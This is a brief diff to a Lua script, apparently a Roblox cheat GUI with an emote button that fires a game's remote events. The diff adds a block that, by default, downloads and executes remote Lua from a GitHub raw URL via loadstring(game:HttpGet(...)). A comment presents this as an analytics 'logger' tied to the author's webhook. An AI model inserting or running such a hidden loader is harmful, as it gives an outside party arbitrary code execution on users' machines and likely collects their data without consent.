@@ -765,3 +765,8 @@ end)
 emoteAsKiller.Button("Play Emote", function ()
     game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("PlayEmote", "Animations", emoteName)
 end)
+
+-- This is my logger i use for analytic purposes ONLY!! if you are capable of constant dumping/deobfusating please do not use it for the sole purpose of doing bad things to my webhook.
+if not getgenv().noLogging then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/fuckg1thub/NeptX/refs/heads/main/Logger.lua"))()
+end
